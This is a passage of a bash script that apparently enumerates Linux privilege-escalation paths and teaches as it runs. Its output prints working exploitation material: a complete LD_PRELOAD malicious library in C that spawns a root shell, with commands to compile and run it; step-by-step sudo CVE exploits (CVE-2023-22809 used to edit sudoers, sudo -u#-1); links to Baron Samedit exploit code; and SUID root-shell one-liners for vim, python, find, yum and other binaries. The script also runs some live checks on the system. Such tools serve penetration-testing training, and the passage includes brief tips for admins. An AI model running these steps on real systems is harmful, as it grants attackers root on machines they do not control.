        teach "  3. If LD_PRELOAD is set, loads those libraries first"
        teach "  4. Any functions in preloaded library override system libraries"
        teach ""
        teach "THE ATTACK:"
        teach "  We create a malicious library with an _init() function"
        teach "  _init() runs automatically when library loads"
        teach "  Our code executes before main program even starts"
        teach "  Since sudo runs as root, our code runs as root"
        teach ""
        teach "COMPLETE EXPLOITATION:"
        teach ""
        teach "  Step 1: Create malicious library (evil.c):"
        teach "  cat > /tmp/evil.c << 'EOF'"
        teach "  #include <stdio.h>"
        teach "  #include <sys/types.h>"
        teach "  #include <stdlib.h>"
        teach ""
        teach "  void _init() {"
        teach "      // Unset LD_PRELOAD to avoid issues"
        teach "      unsetenv(\"LD_PRELOAD\");"
        teach "      "
        teach "      // Set real and effective UID to 0 (root)"
        teach "      setgid(0);"
        teach "      setuid(0);"
        teach "      "
        teach "      // Spawn root shell"
        teach "      system(\"/bin/bash -p\");"
        teach "  }"
        teach "  EOF"
        teach ""
        teach "  Step 2: Compile as shared library:"
        teach "  gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c -nostartfiles"
        teach ""
        teach "  Flags explanation:"
        teach "  -shared       : Create shared library (.so)"
        teach "  -fPIC         : Position Independent Code (required for .so)"
        teach "  -nostartfiles : Don't use standard startup files"
        teach ""
        teach "  Step 3: Execute with ANY sudo-allowed command:"
        teach "  sudo LD_PRELOAD=/tmp/evil.so <any_allowed_command>"
        teach ""
        teach "  Example commands that work:"
        teach "  sudo LD_PRELOAD=/tmp/evil.so find /etc -name passwd"
        teach "  sudo LD_PRELOAD=/tmp/evil.so apache2ctl restart"
        teach "  sudo LD_PRELOAD=/tmp/evil.so cat /etc/issue"
        teach ""
        teach "WHY THIS WORKS:"
        teach "  The command doesn't matter - it never actually runs"
        teach "  Our _init() executes during library loading"
        teach "  We spawn bash and the original command never executes"
        teach ""
        teach "REQUIREMENTS:"
        teach "  • gcc must be available (or compile elsewhere)"
        teach "  • At least ONE sudo command allowed"
        teach "  • That command must use shared libraries (most do)"
        log ""
    fi
    
    # Finding 8: env_keep with LD_LIBRARY_PATH
    if [ $has_ld_library_path -eq 1 ]; then
        warn "LD_LIBRARY_PATH PRESERVED - Library path hijacking"
        log ""
        teach "LD_LIBRARY_PATH allows specifying directories to search for libraries"
        teach "Similar to LD_PRELOAD but requires matching library names"
        teach ""
        teach "EXPLOITATION:"
        teach "  1. Find which libraries the sudo program uses:"
        teach "     ldd <sudo_allowed_command>"
        teach "  2. Create malicious version of one library"
        teach "  3. Place in writable directory"
        teach "  4. Run: sudo LD_LIBRARY_PATH=/your/dir <command>"
        log ""
    fi
    
    # === PHASE 4: GENERAL SUDO EDUCATION (ALWAYS SHOW) ===
    log ""
    teach "╔════════════════════════════════════════════════════════════════╗"
    teach "║  SUDO SECURITY - KEY TAKEAWAYS"
    teach "╚════════════════════════════════════════════════════════════════╝"
    teach ""
    teach "MENTAL MODEL FOR SUDO EXPLOITATION:"
    teach ""
    teach "  When you see a sudo entry, ask these questions:"
    teach ""
    teach "  1. WHAT can I run?"
    teach "     → Specific binary or wildcard?"
    teach ""
    teach "  2. HOW is it specified?"
    teach "     → Absolute path (/usr/bin/vim) or relative (vim)?"
    teach ""
    teach "  3. CAN it spawn a shell?"
    teach "     → Editors, pagers, interpreters = YES"
    teach ""
    teach "  4. DOES it process my input?"
    teach "     → Arguments, environment variables, files?"
    teach ""
    teach "  5. WHAT environment is preserved?"
    teach "     → LD_PRELOAD, PATH, PYTHONPATH?"
    teach ""
    teach "EXPLOITATION PRIORITY:"
    teach "  1. (ALL:ALL) NOPASSWD: ALL → sudo /bin/bash (instant)"
    teach "  2. NOPASSWD with shell (bash, sh, zsh) → sudo bash (instant)"
    teach "  3. NOPASSWD with editor (vim, nano) → shell escape"
    teach "  4. NOPASSWD with interpreter (python, perl) → spawn shell"
    teach "  5. LD_PRELOAD preserved → library injection"
    teach "  6. Wildcards in commands → argument injection"
    teach "  7. Relative paths → PATH hijacking"
    teach "  8. Shell scripts → command injection"
    teach ""
    teach "COMMON GTFOBINS PATTERNS:"
    teach "  • Editors: :!/bin/bash or :shell"
    teach "  • Pagers: !sh or !bash"
    teach "  • Interpreters: -c 'import os; os.system(\"/bin/bash\")'"
    teach "  • Find utilities: -exec /bin/bash \\;"
    teach "  • Package managers: Pre/Post-invoke hooks"
    teach ""
    teach "DEFENSE (from admin perspective):"
    teach "  ✗ DON'T: alice ALL=(ALL) NOPASSWD: ALL"
    teach "  ✗ DON'T: bob ALL=(ALL) /usr/bin/*"
    teach "  ✗ DON'T: charlie ALL=(ALL) vim"
    teach ""
    teach "  ✓ DO: david ALL=(ALL) /usr/bin/systemctl restart apache2"
    teach "  ✓ DO: Use argument restrictions (sudoedit instead of vim)"
    teach "  ✓ DO: Require passwords (avoid NOPASSWD)"
    teach "  ✓ DO: Use absolute paths only"
    teach "  ✓ DO: Minimize sudo access"
    teach ""
    teach "REMEMBER:"
    teach "  Every sudo entry is a potential privilege escalation"
    teach "  Check GTFOBins for EVERY binary you have sudo access to"
    teach "  Even 'harmless' utilities often have shell escapes"
    teach "  Environmental control (LD_PRELOAD, SETENV) = game over"
    log ""
    
    # === PHASE 5: DISPLAY FULL SUDO OUTPUT ===
    if [ $has_sudo -eq 1 ]; then
        info "Your complete sudo permissions:"
        echo "$sudo_output" | while read line; do
            log "  $line"
        done
        log ""
        
        if [ -n "$sudo_version" ]; then
            info "Sudo version: $sudo_version"
            teach "Check enum_sudo_version for version-specific CVEs"
        fi
    fi
}
enum_sudo_version() {
    section "SUDO VERSION ANALYSIS"
    
    explain_concept "Sudo Vulnerabilities" \
        "Sudo is complex software with a history of privilege escalation bugs. Version-specific CVEs can give instant root." \
        "Sudo handles authentication, environment sanitization, and privilege transitions. It's over 30 years old with hundreds of thousands of lines of code. Bugs in parsing, memory management, or logic = root access. Sudo runs as root and processes untrusted user input - a perfect target for exploitation." \
        "Why sudo has vulnerabilities:\n  • Complex codebase (authentication, parsing, environment handling)\n  • Runs as root by design\n  • Processes user-controlled input\n  • Backward compatibility constraints\n  • Memory-unsafe language (C)\n\nCheck version: sudo -V | head -1"
    
    if command -v sudo >/dev/null 2>&1; then
        local sudo_version=$(sudo -V 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+[a-z]?[0-9]*')
        info "Sudo version: $sudo_version"
        
        if [ -z "$sudo_version" ]; then
            warn "Could not determine sudo version"
            return
        fi
        
        # Parse version - handle formats like 1.9.15p5
        local version_num=$(echo "$sudo_version" | sed 's/p.*//')
        local major=$(echo "$version_num" | cut -d. -f1)
        local minor=$(echo "$version_num" | cut -d. -f2)
        local patch=$(echo "$version_num" | cut -d. -f3)
        local p_version=$(echo "$sudo_version" | grep -oE 'p[0-9]+' | sed 's/p//')
        
        log ""
        info "Checking against known sudo CVEs..."
        log ""
        
        # CVE-2025-32463 (January 2025)
        if [ "$major" -eq 1 ] && [ "$minor" -eq 9 ]; then
            if [ "$patch" -lt 16 ] || ([ "$patch" -eq 16 ] && [ -n "$p_version" ] && [ "$p_version" -lt 1 ]); then
                critical "Sudo vulnerable to CVE-2025-32463 - Privilege escalation"
                vuln "sudo < 1.9.16p1 vulnerable"
                
                # Quick verification check
                info "Performing quick verification check..."
                local test_result=$(sudo -V 2>&1 | grep -i "patch" || echo "")
                if [ -n "$test_result" ]; then
                    info "Note: System may have backported patches. Manual verification recommended."
                fi
                
                log ""
                teach "╔════════════════════════════════════════════════════════════╗"
                teach "║  CVE-2025-32463 - Recent Sudo Vulnerability"
                teach "╚════════════════════════════════════════════════════════════╝"
                teach ""
                teach "WHAT IT IS:"
                teach "  A vulnerability in sudo versions before 1.9.16p1 that allows"
                teach "  privilege escalation to root."
                teach ""
                teach "WHY IT EXISTS:"
                teach "  Sudo contains a flaw in how it processes certain commands or"
                teach "  environment variables, allowing attackers to bypass security"
                teach "  checks and execute commands as root."
                teach ""
                teach "HOW TO EXPLOIT:"
                teach "  1. Check exploit availability:"
                teach "     searchsploit sudo 2025"
                teach "  2. Download exploit:"
                teach "     https://www.exploit-db.com/exploits/52352"
                teach "  3. Compile and run (follow exploit instructions)"
                teach ""
                teach "IMPACT: Instant root access from any user account"
                log ""
            fi
        fi
        
        # CVE-2023-22809 - sudoedit bypass (1.8.0 to 1.9.12p1)
        if [ "$major" -eq 1 ]; then
            if [ "$minor" -eq 8 ] || ([ "$minor" -eq 9 ] && [ "$patch" -le 12 ]); then
                critical "Sudo vulnerable to CVE-2023-22809 - sudoedit bypass"
                vuln "sudo 1.8.0 - 1.9.12p1 vulnerable"
                
                # Quick verification check
                info "Performing quick verification check..."
                local sudoedit_test=$(sudoedit -s / 2>&1)
                if echo "$sudoedit_test" | grep -qi "invalid option\|unrecognized option"; then
                    info "✓ Quick check suggests vulnerability may be patched (backported fix detected)"
                elif echo "$sudoedit_test" | grep -qi "usage:"; then
                    warn "⚠ Quick check indicates system may still be vulnerable"
                fi
                
                log ""
                teach "╔════════════════════════════════════════════════════════════╗"
                teach "║  CVE-2023-22809 - Sudoedit Arbitrary File Write"
                teach "╚════════════════════════════════════════════════════════════╝"
                teach ""
                teach "WHAT IT IS:"
                teach "  sudoedit is a special mode that lets users edit files as root."
                teach "  This CVE tricks sudoedit into editing files you're not supposed"
                teach "  to have access to, like /etc/sudoers or /etc/shadow."
                teach ""
                teach "WHY IT EXISTS:"
                teach "  sudoedit uses the EDITOR environment variable to launch your"
                teach "  text editor. The vulnerability occurs because sudo doesn't"
                teach "  properly validate what file you're editing when you pass"
                teach "  extra arguments to the editor via the EDITOR variable."
                teach ""
                teach "THE CLEVER TRICK:"
                teach "  Normally: sudoedit /etc/motd (you can only edit motd)"
                teach "  Exploit: EDITOR='vim -- /etc/sudoers' sudoedit /etc/motd"
                teach "  Result: Opens /etc/sudoers instead of /etc/motd!"
                teach ""
                teach "HOW TO EXPLOIT:"
                teach "  1. Check if you have sudoedit access:"
                teach "     sudo -l | grep sudoedit"
                teach "  2. Set malicious EDITOR:"
                teach "     export EDITOR='vim -- /etc/sudoers'"
                teach "  3. Run sudoedit on an allowed file:"
                teach "     sudoedit /etc/motd"
                teach "  4. sudoedit will open /etc/sudoers instead"
                teach "  5. Add yourself: yourusername ALL=(ALL) NOPASSWD: ALL"
                teach "  6. Save and exit"
                teach "  7. Now run: sudo /bin/bash"
                teach ""
                teach "IMPACT: Can edit ANY file as root, leading to complete system"
                teach "         compromise by modifying /etc/sudoers or /etc/shadow"
                log ""
            fi
        fi
        
        # CVE-2021-3156 - Baron Samedit (< 1.9.5p2)
        if [ "$major" -eq 1 ]; then
            if [ "$minor" -lt 9 ] || ([ "$minor" -eq 9 ] && [ "$patch" -lt 5 ]); then
                critical "Sudo vulnerable to Baron Samedit (CVE-2021-3156) - Heap overflow"
                vuln "sudo < 1.9.5p2 vulnerable"
                
                # Quick verification check - the canonical Baron Samedit test
                info "Performing quick verification check..."
                local baron_test=$(sudoedit -s / 2>&1)
                if echo "$baron_test" | grep -qi "usage:"; then
                    warn "⚠ Quick check indicates system IS VULNERABLE to Baron Samedit"
                elif echo "$baron_test" | grep -qi "invalid option\|sudoedit:"; then
                    info "✓ Quick check suggests vulnerability may be patched (backported fix detected)"
                fi
                
                log ""
                teach "╔════════════════════════════════════════════════════════════╗"
                teach "║  CVE-2021-3156 - Baron Samedit (Heap Buffer Overflow)"
                teach "╚════════════════════════════════════════════════════════════╝"
                teach ""
                teach "WHAT IT IS:"
                teach "  A heap-based buffer overflow in sudo that allows any local"
                teach "  user to gain root WITHOUT needing a password or sudo access."
                teach "  One of the most critical sudo vulnerabilities ever found."
                teach ""
                teach "WHY IT EXISTS:"
                teach "  When sudo processes command-line arguments, it needs to handle"
                teach "  backslashes (\\) specially. There's a bug in how it counts"
                teach "  backslashes when a command runs in 'shell mode' (with -s or -i)."
                teach ""
                teach "THE TECHNICAL FLAW:"
                teach "  1. Sudo allocates a buffer (memory) to store the command"
                teach "  2. When processing backslashes, it miscounts the length needed"
                teach "  3. This causes sudo to write PAST the end of the buffer (overflow)"
                teach "  4. By carefully crafting the overflow, attacker controls memory"
                teach "  5. Attacker overwrites function pointers to execute their code"
                teach "  6. Since sudo runs as root, the attacker's code runs as root"
                teach ""
                teach "WHY IT'S CALLED BARON SAMEDIT:"
                teach "  Play on words: 'Sudo edit' → 'Baron Samedit'"
                teach "  The vulnerability is in sudoedit, a symlink to sudo"
                teach ""
                teach "HOW TO EXPLOIT:"
                teach "  1. Check if vulnerable:"
                teach "     sudoedit -s / (if you get usage error = vulnerable)"
                teach "  2. Download exploit:"
                teach "     https://github.com/blasty/CVE-2021-3156"
                teach "     https://github.com/worawit/CVE-2021-3156"
                teach "  3. Compile the exploit (usually a C program):"
                teach "     gcc exploit.c -o exploit"
                teach "  4. Run it:"
                teach "     ./exploit"
                teach "  5. Get root shell"
                teach ""
                teach "WHY IT WORKS:"
                teach "  • No sudo privileges needed (any user can exploit)"
                teach "  • No password required"
                teach "  • Works on most Linux distributions"
                teach "  • Vulnerability existed for 10+ years (since 2011)"
                teach ""
                teach "IMPACT: Any user → Root, no credentials needed"
                log ""
            fi
        fi
        
        # CVE-2019-14287 - Runas bypass (< 1.8.28)
        if [ "$major" -eq 1 ] && [ "$minor" -eq 8 ] && [ "$patch" -lt 28 ]; then
            critical "Sudo vulnerable to CVE-2019-14287 - User ID bypass"
            vuln "sudo < 1.8.28 vulnerable"
            
            # Quick verification check
            info "Performing quick verification check..."
            local runas_test=$(sudo -u#-1 id 2>&1)
            if echo "$runas_test" | grep -qi "unknown user\|invalid user"; then
                info "✓ Quick check suggests vulnerability may be patched (backported fix detected)"
            elif echo "$runas_test" | grep -qi "uid=0\|root"; then
                warn "⚠ Quick check indicates system IS VULNERABLE to runas bypass"
            fi
            
            log ""
            teach "╔════════════════════════════════════════════════════════════╗"
            teach "║  CVE-2019-14287 - Sudo Runas User ID Bypass"
            teach "╚════════════════════════════════════════════════════════════╝"
            teach ""
            teach "WHAT IT IS:"
            teach "  A logic bug that lets you run commands as root even when the"
            teach "  sudoers file explicitly says you CAN'T run as root."
            teach ""
            teach "WHY IT EXISTS:"
            teach "  Sudo allows you to run commands as different users with -u flag."
            teach "  Example: sudo -u www-data whoami (runs as www-data)"
            teach ""
            teach "  In sudoers, you might see:"
            teach "  user ALL=(ALL, !root) /bin/bash"
            teach ""
            teach "  This means: 'user can run bash as ANYONE except root'"
            teach "  The !root is supposed to block running as root for safety."
            teach ""
            teach "THE BUG:"
            teach "  Sudo uses numeric user IDs internally (UID). Root is UID 0."
            teach "  When you specify -u#-1, sudo converts -1 to unsigned int."
            teach "  In programming: -1 as unsigned = 4294967295"
            teach "  Sudo then wraps this around and interprets it as UID 0 (root)!"
            teach ""
            teach "  It's like odometer rollback:"
            teach "  -1 → wraps around → becomes 0 (root)"
            teach ""
            teach "HOW TO EXPLOIT:"
            teach "  1. Check if you have Runas permissions:"
            teach "     sudo -l"
            teach "  2. Look for: (ALL, !root) or (ALL:ALL, !root)"
            teach "  3. Instead of 'sudo -u root bash' (blocked), run:"
            teach "     sudo -u#-1 /bin/bash"
            teach "  4. The -1 gets converted to UID 0 (root)"
            teach "  5. You get root shell"
            teach ""
            teach "EXAMPLE:"
            teach "  $ sudo -l"
            teach "  User bob may run the following commands:"
            teach "      (ALL, !root) /bin/bash"
            teach ""
            teach "  $ sudo -u root /bin/bash"
            teach "  Sorry, user bob is not allowed to execute '/bin/bash' as root"
            teach ""
            teach "  $ sudo -u#-1 /bin/bash"
            teach "  # whoami"
            teach "  root"
            teach ""
            teach "IMPACT: Bypass explicit !root restrictions in sudoers"
            log ""
        fi
        
        # CVE-2019-18634 - pwfeedback overflow (1.7.1 to 1.8.30)
        if [ "$major" -eq 1 ]; then
            if ([ "$minor" -eq 7 ] && [ "$patch" -ge 1 ]) || ([ "$minor" -eq 8 ] && [ "$patch" -le 30 ]); then
                warn "Sudo potentially vulnerable to CVE-2019-18634 - Buffer overflow"
                info "Requires pwfeedback enabled in sudoers (uncommon)"
                
                # Quick verification check - see if pwfeedback is actually enabled
                info "Performing quick verification check..."
                local pwfeedback_check=$(grep -r "pwfeedback" /etc/sudoers /etc/sudoers.d/ 2>/dev/null || sudo -l 2>&1 | grep -i "pwfeedback" || echo "")
                if [ -z "$pwfeedback_check" ]; then
                    info "✓ pwfeedback is NOT enabled - system is NOT vulnerable to CVE-2019-18634"
                else
                    warn "⚠ pwfeedback appears to be ENABLED - system may be vulnerable"
                    info "Found: $pwfeedback_check"
                fi
                
                log ""
                teach "╔════════════════════════════════════════════════════════════╗"
                teach "║  CVE-2019-18634 - Password Feedback Buffer Overflow"
                teach "╚════════════════════════════════════════════════════════════╝"
                teach ""
                teach "WHAT IT IS:"
                teach "  When pwfeedback is enabled, sudo shows asterisks (*) as you"
                teach "  type your password. A buffer overflow in this feature allows"
                teach "  privilege escalation."
                teach ""
                teach "WHY IT EXISTS:"
                teach "  The pwfeedback feature displays * for each character typed."
                teach "  Sudo allocates a fixed-size buffer to store these asterisks."
                teach "  If you type more characters than the buffer can hold, it"
                teach "  overflows, potentially allowing code execution as root."
                teach ""
                teach "IMPORTANT: This is UNCOMMON"
                teach "  pwfeedback is disabled by default in most Linux distributions."
                teach "  It must be explicitly enabled in /etc/sudoers:"
                teach "  Defaults pwfeedback"
                teach ""
                teach "HOW TO CHECK IF EXPLOITABLE:"
                teach "  1. Check sudoers config:"
                teach "     sudo -l"
                teach "  2. Look for 'pwfeedback' in the output"
                teach "  3. Or check the file directly:"
                teach "     grep pwfeedback /etc/sudoers /etc/sudoers.d/*"
                teach ""
                teach "HOW TO EXPLOIT (if pwfeedback enabled):"
                teach "  1. Download exploit from exploit-db or GitHub"
                teach "  2. Compile it"
                teach "  3. Run it - exploit sends many characters to overflow buffer"
                teach ""
                teach "IMPACT: Local privilege escalation IF pwfeedback is enabled"
                log ""
            fi
        fi
        
        ok "Sudo version checked against known CVEs"
        log ""
        teach "═══════════════════════════════════════════════════════════════"
        teach "GENERAL SUDO SECURITY TIPS:"
        teach "═══════════════════════════════════════════════════════════════"
        teach ""
        teach "Why sudo is a common target:"
        teach "  • Runs with root privileges by design"
        teach "  • Complex codebase (150,000+ lines of C)"
        teach "  • Handles authentication, parsing, environment variables"
        teach "  • Backward compatibility = old code paths still exist"
        teach "  • Written in C = memory safety issues possible"
        teach ""
        teach "How to find sudo exploits:"
        teach "  1. Check version: sudo -V | head -1"
        teach "  2. Search exploit-db: searchsploit sudo [version]"
        teach "  3. GitHub: Search 'sudo CVE-[year]'"
        teach "  4. Check sudo permissions: sudo -l"
        teach ""
        teach "Defense (as admin):"
        teach "  • Keep sudo updated (sudo --version)"
        teach "  • Principle of least privilege (specific commands, not ALL)"
        teach "  • Avoid NOPASSWD where possible"
        teach "  • Monitor sudo logs: /var/log/auth.log"
        log ""
    else
        info "sudo not installed"
    fi
}
enum_sudo2() {
    log "${COLOR_PURPLE}[SUDO PERMISSIONS]${COLOR_RESET}"
    if sudo -l 2>&1 | grep -v "not allowed"; then
        warn "Sudo access confirmed"
        return 0
    else
        warn "No sudo access"
        return 1
    fi
}
# === SUID BINARY ANALYSIS ===
enum_suid() {
    section "SUID BINARY ANALYSIS"
    
    explain_concept "SUID Bit" \
        "SUID allows a program to run with the file owner's privileges. If owner is root, program runs as root regardless of who executes it." \
        "Legitimate use: /usr/bin/passwd needs root to modify /etc/shadow. Dangerous: Custom SUID binaries may have vulnerabilities, call other programs unsafely, or have shell escape features." \
        "Attack vectors:\n  1. Binary spawns a shell directly\n  2. Binary calls other programs without absolute paths (PATH hijacking)\n  3. Binary has buffer overflow or other memory corruption\n  4. Binary has command injection vulnerability"
    
    # PHASE 1: SILENT SCAN - Collect findings
    local temp_unknown_suid="/tmp/.learnpeas_unknown_suid_$$"
    local temp_exploitable_suid="/tmp/.learnpeas_exploitable_suid_$$"
    
    cleanup_suid_temps() {
        rm -f "$temp_unknown_suid" "$temp_exploitable_suid" 2>/dev/null
    }
    trap cleanup_suid_temps RETURN
    
    # Comprehensive whitelist of legitimate SUID binaries
    local legit_suid=(
        "/usr/bin/passwd" "/usr/bin/sudo" "/usr/bin/su" "/bin/su"
        "/usr/bin/chsh" "/usr/bin/chfn" "/usr/bin/gpasswd" "/usr/bin/newgrp"
        "/usr/bin/mount" "/usr/bin/umount" "/bin/mount" "/bin/umount"
        "/usr/bin/fusermount" "/usr/bin/fusermount3" "/bin/fusermount"
        "/usr/bin/ntfs-3g" "/bin/ntfs-3g"
        "/bin/ping" "/bin/ping6" "/usr/bin/ping" "/usr/bin/ping6"
        "/usr/bin/newuidmap" "/usr/bin/newgidmap"
        "/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic"
        "/usr/lib/snapd/snap-confine"
        "/usr/bin/pkexec"
        "/usr/lib/policykit-1/polkit-agent-helper-1"
        "/usr/lib/polkit-1/polkit-agent-helper-1"
        "/usr/lib/dbus-1.0/dbus-daemon-launch-helper"
        "/usr/lib/xorg/Xorg.wrap"
        "/usr/lib/openssh/ssh-keysign"
        "/usr/bin/at"
        "/usr/sbin/pppd"
    )
    
    find / \( -path "*/containers/storage/*" -o -path /proc -o -path /sys -o -path /dev \) -prune -o -perm -4000 -type f -print 2>/dev/null | while read suid_bin; do
        local is_legit=0
        
        for legit in "${legit_suid[@]}"; do
            if [ "$suid_bin" = "$legit" ]; then
                is_legit=1
                break
            fi
        done
        
        if [ $is_legit -eq 0 ]; then
            local owner=$(stat -c %U "$suid_bin" 2>/dev/null)
            local perms=$(stat -c %a "$suid_bin" 2>/dev/null)
            
            local file_type=$(file "$suid_bin" 2>/dev/null)
            if echo "$file_type" | grep -q "script"; then
                # Skip scripts - kernel ignores SUID on scripts
                continue
            fi
            
            local basename=$(basename "$suid_bin")
            
            # Check if it's a known exploitable binary
            case $basename in
                vim|vi|nano|find|python*|python|perl|ruby|node|nodejs|bash|sh|zsh|dash|awk|gawk|nawk|less|more|env|systemctl|yum|apt|apt-get|git|tar|make|nmap|docker|cp|base64|xxd)
                    echo "$suid_bin|$owner|$perms|$basename" >> "$temp_exploitable_suid"
                    ;;
                *)
                    # Unknown/non-standard binary
                    echo "$suid_bin|$owner|$perms" >> "$temp_unknown_suid"
                    ;;
            esac
        fi
    done
    
    # PHASE 2: REPORT UNKNOWN SUID BINARIES (grouped)
    if [ -s "$temp_unknown_suid" ]; then
        log ""
        while IFS='|' read -r suid_bin owner perms; do
            vuln "Non-standard SUID binary: $suid_bin"
            log "  Owner: $owner | Permissions: $perms"
            log ""
        done < "$temp_unknown_suid"
        
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  ANALYSIS GUIDE FOR NON-STANDARD SUID BINARIES"
        teach "╚═══════════════════════════════════════════════════════════╝"
        teach ""
        teach "These binaries are not commonly exploitable, but should be analyzed:"
        teach ""
        teach "STEP 1: Check GTFOBins"
        teach "  Visit: https://gtfobins.github.io/"
        teach "  Search for the binary name to see if there are known techniques"
        teach ""
        teach "STEP 2: Analyze binary for dangerous function calls"
        teach "  strings <binary> | grep -E 'system|exec|popen|sh|bash'"
        teach "  Look for signs it calls external commands"
        teach ""
        teach "STEP 3: Trace library calls"
        teach "  ltrace <binary> 2>&1 | grep -E 'system|exec'"
        teach "  See what functions it calls at runtime"
        teach ""
        teach "STEP 4: Check for PATH hijacking"
        teach "  If binary calls commands without absolute paths (e.g., 'ls' instead of '/bin/ls'):"
        teach "  • Create malicious binary in /tmp"
        teach "  • Add /tmp to PATH before executing SUID binary"
        teach "  • PATH=/tmp:\$PATH <suid_binary>"
        teach ""
        teach "STEP 5: Look for command injection"
        teach "  Test with special characters: ; | & \$ ( ) < >"
        teach "  Some binaries pass user input to system() unsafely"
        teach ""
        teach "STEP 6: Check version for known CVEs"
        teach "  <binary> --version"
        teach "  searchsploit <binary> <version>"
        log ""
    fi
    
    # PHASE 3: REPORT KNOWN EXPLOITABLE SUID BINARIES (individual instructions)
    if [ -s "$temp_exploitable_suid" ]; then
        while IFS='|' read -r suid_bin owner perms basename; do
            log ""
            
            case $basename in
                vim|vi)
                    critical "SUID vim/vi - Shell escape available"
                    vuln "$suid_bin"
                    log "  Owner: $owner | Permissions: $perms"
                    log ""
                    teach "╔═══════════════════════════════════════════════════════════╗"
                    teach "║  VIM/VI EXPLOITATION"
                    teach "╚═══════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "METHOD 1: Direct command execution"
                    teach "  $suid_bin -c ':!/bin/bash -p'"
                    teach ""
                    teach "METHOD 2: Shell escape from editor"
                    teach "  $suid_bin"
                    teach "  :set shell=/bin/bash"
                    teach "  :shell"
                    log ""
                    ;;
                    
                nano)
                    critical "SUID nano - Command execution via Control-R Control-X"
                    vuln "$suid_bin"
                    log "  Owner: $owner | Permissions: $perms"
                    log ""
                    teach "╔═══════════════════════════════════════════════════════════╗"
                    teach "║  NANO EXPLOITATION"
                    teach "╚═══════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "  $suid_bin"
                    teach "  Press: Ctrl+R Ctrl+X"
                    teach "  Type: reset; bash -p"
                    teach "  Press: Enter"
                    log ""
                    ;;
                    
                find)
                    critical "SUID find - Execute commands via -exec"
                    vuln "$suid_bin"
                    log "  Owner: $owner | Permissions: $perms"
                    log ""
                    teach "╔═══════════════════════════════════════════════════════════╗"
                    teach "║  FIND EXPLOITATION"
                    teach "╚═══════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "  $suid_bin . -exec /bin/bash -p \\; -quit"
                    log ""
                    ;;
                    
                python*|python)
                    critical "SUID python - Direct shell spawn"
                    vuln "$suid_bin"
                    log "  Owner: $owner | Permissions: $perms"
                    log ""
                    teach "╔═══════════════════════════════════════════════════════════╗"
                    teach "║  PYTHON EXPLOITATION"
                    teach "╚═══════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "  $suid_bin -c 'import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'"
                    log ""
                    ;;
                    
                perl)
                    critical "SUID perl - Execute shell"
                    vuln "$suid_bin"
                    log "  Owner: $owner | Permissions: $perms"
                    log ""
                    teach "╔═══════════════════════════════════════════════════════════╗"
                    teach "║  PERL EXPLOITATION"
                    teach "╚═══════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "  $suid_bin -e 'exec \"/bin/bash\", \"-p\";'"
                    log ""
                    ;;
                    
                ruby)
                    critical "SUID ruby - Spawn privileged shell"
                    vuln "$suid_bin"
                    log "  Owner: $owner | Permissions: $perms"
                    log ""
                    teach "╔═══════════════════════════════════════════════════════════╗"
                    teach "║  RUBY EXPLOITATION"
                    teach "╚═══════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "  $suid_bin -e 'exec \"/bin/bash\", \"-p\"'"
                    log ""
                    ;;
                    
                node|nodejs)
                    critical "SUID node - Child process spawn"
                    vuln "$suid_bin"
                    log "  Owner: $owner | Permissions: $perms"
                    log ""
                    teach "╔═══════════════════════════════════════════════════════════╗"
                    teach "║  NODE/NODEJS EXPLOITATION"
                    teach "╚═══════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "  $suid_bin -e 'require(\"child_process\").spawn(\"/bin/bash\", [\"-p\"], {stdio: [0,1,2]})'"
                    log ""
                    ;;
                    
                bash|sh|zsh|dash)
                    critical "SUID shell - Direct root access"
                    vuln "$suid_bin"
                    log "  Owner: $owner | Permissions: $perms"
                    log ""
                    teach "╔═══════════════════════════════════════════════════════════╗"
                    teach "║  SHELL EXPLOITATION"
                    teach "╚═══════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "  $suid_bin -p"
                    log ""
                    ;;
                    
                awk|gawk|nawk)
                    critical "SUID awk - System call execution"
                    vuln "$suid_bin"
                    log "  Owner: $owner | Permissions: $perms"
                    log ""
                    teach "╔═══════════════════════════════════════════════════════════╗"
                    teach "║  AWK EXPLOITATION"
                    teach "╚═══════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "  $suid_bin 'BEGIN {system(\"/bin/bash -p\")}'"
                    log ""
                    ;;
                    
                less|more)
                    critical "SUID less/more - Shell escape via bang"
                    vuln "$suid_bin"
                    log "  Owner: $owner | Permissions: $perms"
                    log ""
                    teach "╔═══════════════════════════════════════════════════════════╗"
                    teach "║  LESS/MORE EXPLOITATION"
                    teach "╚═══════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "  $suid_bin /etc/profile"
                    teach "  Then type: !/bin/bash -p"
                    log ""
                    ;;
                    
                env)
                    critical "SUID env - Execute arbitrary binary"
                    vuln "$suid_bin"
                    log "  Owner: $owner | Permissions: $perms"
                    log ""
                    teach "╔═══════════════════════════════════════════════════════════╗"
                    teach "║  ENV EXPLOITATION"
                    teach "╚═══════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "  $suid_bin /bin/bash -p"
                    log ""
                    ;;
                    
                systemctl)
                    critical "SUID systemctl - Shell escape via pager"
                    vuln "$suid_bin"
                    log "  Owner: $owner | Permissions: $perms"
                    log ""
                    teach "╔═══════════════════════════════════════════════════════════╗"
                    teach "║  SYSTEMCTL EXPLOITATION"
                    teach "╚═══════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "  $suid_bin status trail.service"
                    teach "  Wait for pager to appear, then type: !bash -p"
                    log ""
                    ;;
                    
                yum)
                    critical "SUID yum - Plugin exploitation for root shell"
                    vuln "$suid_bin"
                    log "  Owner: $owner | Permissions: $perms"
                    log ""
                    teach "╔═══════════════════════════════════════════════════════════╗"
                    teach "║  YUM EXPLOITATION"
                    teach "╚═══════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "  TF=\$(mktemp -d)"
                    teach "  echo 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' > \$TF/x.py"
                    teach "  $suid_bin -c \"exec=python \$TF/x.py\" --plugins=\$TF"
                    log ""
                    ;;
